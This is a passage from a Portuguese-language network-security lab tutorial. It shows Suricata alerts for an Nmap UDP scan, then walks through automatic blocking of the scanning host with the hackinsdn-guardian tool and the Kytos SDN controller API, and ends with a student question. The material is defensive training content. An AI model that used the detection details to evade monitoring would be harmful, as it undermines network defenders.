29/09/2024-14:36:47.316556  [Drop] [**] [1:1000010:6] POSSBL SCAN NMAP UDP (type -sU) [**] [Classification: Attempted Information Leak] [Priority: 2] {UDP} 192.168.20.10:60561 -> 172.16.50.1:428
29/09/2024-14:36:47.349882  [Drop] [**] [1:1000010:6] POSSBL SCAN NMAP UDP (type -sU) [**] [Classification: Attempted Information Leak] [Priority: 2] {UDP} 192.168.20.10:60567 -> 172.16.50.1:176
29/09/2024-14:36:47.383208  [Drop] [**] [1:1000010:6] POSSBL SCAN NMAP UDP (type -sU) [**] [Classification: Attempted Information Leak] [Priority: 2] {UDP} 192.168.20.10:60569 -> 172.16.50.1:765
29/09/2024-14:36:47.451793  [Drop] [**] [1:1000010:6] POSSBL SCAN NMAP UDP (type -sU) [**] [Classification: Attempted Information Leak] [Priority: 2] {UDP} 192.168.20.10:60569 -> 172.16.50.1:176
29/09/2024-14:36:47.488543  [Drop] [**] [1:1000010:6] POSSBL SCAN NMAP UDP (type -sU) [**] [Classification: Attempted Information Leak] [Priority: 2] {UDP} 192.168.20.10:60567 -> 172.16.50.1:518
29/09/2024-14:36:47.598341  [Drop] [**] [1:1000010:6] POSSBL SCAN NMAP UDP (type -sU) [**] [Classification: Attempted Information Leak] [Priority: 2] {UDP} 192.168.20.10:60563 -> 172.16.50.1:434
29/09/2024-14:36:47.793855  [Drop] [**] [1:1000010:6] POSSBL SCAN NMAP UDP (type -sU) [**] [Classification: Attempted Information Leak] [Priority: 2] {UDP} 192.168.20.10:60567 -> 172.16.50.1:322
```

Como pode ser visto acima, o tráfego está sendo espelhado para o IDS e o Suricata está identificando o ataque de varredura UDP, a partir das regras customizadas. Cada regra no Suricata possui um ID único, no caso dos alertas acima, o ID da regra é `1000010`. Você pode visualizar essa regra a partir do seguinte comando no terminal do host ids201:
```
grep -wR sid:1000010 /etc/suricata
```

Note, ainda, que os alertas gerados pelo IDS possuem uma tag de ação a ser tomada: `[DROP]`. Essa ação, no entanto, não estava definida na regra, conforme pode ser visto na saída do comando grep anterior. Isso ocorre pois existe uma outra configuração do Suricata localizada no arquivo `/etc/suricata/drop.conf` que define quais regras terão como ação o bloqueio automático.


O próximo passo, portanto, consiste em de fato habilitar o bloqueio automático. Conforme citado anteriormente, ao executar IDS em modo de espelhamento de tráfego, as ações de bloqueio valem-se de chamadas de APIs para sistemas externos (tipicamente Firewalls) para efetivar os bloqueios. Para efetuar o bloqueio externo vamos utilizar uma ferramenta chamada `hackinsdn-guardian` que faz o _parsing_ dos logs JSON do Suricata (i.e, `eve.log` -- que inclui informações importantes do tráfego, como a VLAN por exemplo)  e dispara chamadas de bloqueio externo, em particular bloqueios no controlador SDN Kytos.


No terminal do host ids201, execute os seguintes comandos:
```
export KYTOS_URL=http://10.20.1.3:8181
```
```
echo > /var/log/suricata/eve.json
```
```
python3 /usr/local/bin/hackinsdn-guardian.py -e /var/log/suricata/eve.json -d 300
```


A partir dos comandos acima, a aplicação hackinsdn-guardian irá analisar o arquivo `eve.json` que contém informações sobre os ataques conforme identificado pelo Suricata (incluindo as  VLANs dos hosts), se for detectado um ataque, promove um bloqueio do host com duração de 300 segundos. 

Aguarde alguns segundos até que um novo ataque de varredura seja executado pelo Secflood e observe no terminal do host ids201 a mensagem de bloqueio sendo criado. No terminal do host ids201 você deve visualizar uma mensagem do tipo:
```
Mon Sep 30 09:02:15 UTC 2024 Block untagged 192.168.20.10
```

Por fim, acesse novamente o terminal do srv501 e rode o comando abaixo para confirmar que o ataque não mais afeta o host srv501 (lembre-se de aguardar no mínimo 30 segundos que é o intervalo entre execuções configurado no Secflood):
```
tcpdump -i srv501-eth0 -n
```

> [!IMPORTANT]  
> O bloqueio automático de ataques como mostrado acima é uma ferramenta interessante para a rápida resposta a incidentes de segurança, porém ele vem acompanhado de alguns riscos. Quais riscos você observa na estratégia adotada acima e como esses riscos podem ser mitigados?
<textarea name="resposta_bloqueio_automatico" rows="6" cols="80" placeholder="Escreva sua resposta aqui...">
</textarea>

Opcionalmente, é possível remover manualmente o bloqueio acima. Para isso, no terminal do host ids201 pare a execução do `hackinsdn-guardian` com o comando CTRL+C. Em seguida, execute o comando abaixo no terminal do host ids201 para visualizar os bloqueios ativos:
```
curl -X GET -H 'Content-type: application/json' $KYTOS_URL/api/hackinsdn/containment/v1/ | jq -r
```

A partir da saída do comando acima, pode ser obtido o ID do bloqueio. Em seguida, pode-se excluir a regra de bloqueio, a partir do seguinte comando a ser executado também no terminal do host ids201 (Substitua o `ID_BLOQUEIO` com o valor obtido no passo anterior):
```
curl -s -X DELETE $KYTOS_URL/api/hackinsdn/containment/v1/ID_BLOQUEIO
```

Com isso concluímos este laboratório!
